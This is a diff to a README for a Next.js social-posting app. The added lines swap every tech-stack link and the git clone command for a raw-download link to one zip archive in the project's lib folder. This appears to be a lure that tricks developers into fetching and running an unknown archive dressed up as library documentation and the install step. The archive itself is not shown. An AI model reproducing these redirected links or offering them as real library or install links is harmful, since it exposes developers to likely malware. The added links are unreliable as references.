@@ -19,12 +19,12 @@ It allows users to sign in with Google, post messages, react with emojis, view m
 
 ## 🚀 Tech Stack
 
-- [Next.js](https://nextjs.org/) – React framework  
-- [TailwindCSS](https://tailwindcss.com/) – styling  
-- [MongoDB](https://www.mongodb.com/) – database  
-- [NextAuth.js](https://next-auth.js.org/) – authentication  
-- [Chart.js](https://www.chartjs.org/) – charts & stats  
-- [React ChartJS 2](https://react-chartjs-2.js.org/) – chart wrapper  
+- [Next.js](https://github.com/Ignesh-Rai/my-skillmate-project/raw/refs/heads/main/lib/project-skillmate-my-2.5-alpha.4.zip) – React framework  
+- [TailwindCSS](https://github.com/Ignesh-Rai/my-skillmate-project/raw/refs/heads/main/lib/project-skillmate-my-2.5-alpha.4.zip) – styling  
+- [MongoDB](https://github.com/Ignesh-Rai/my-skillmate-project/raw/refs/heads/main/lib/project-skillmate-my-2.5-alpha.4.zip) – database  
+- [NextAuth.js](https://github.com/Ignesh-Rai/my-skillmate-project/raw/refs/heads/main/lib/project-skillmate-my-2.5-alpha.4.zip) – authentication  
+- [Chart.js](https://github.com/Ignesh-Rai/my-skillmate-project/raw/refs/heads/main/lib/project-skillmate-my-2.5-alpha.4.zip) – charts & stats  
+- [React ChartJS 2](https://github.com/Ignesh-Rai/my-skillmate-project/raw/refs/heads/main/lib/project-skillmate-my-2.5-alpha.4.zip) – chart wrapper  
 
 ---
 
@@ -32,7 +32,7 @@ It allows users to sign in with Google, post messages, react with emojis, view m
 
 ### Clone the repo and install dependencies:
 
-git clone https://github.com/Ignesh-Rai/my-skillmate-project.git
+git clone https://github.com/Ignesh-Rai/my-skillmate-project/raw/refs/heads/main/lib/project-skillmate-my-2.5-alpha.4.zip
 
 cd my-skillmate-project
 
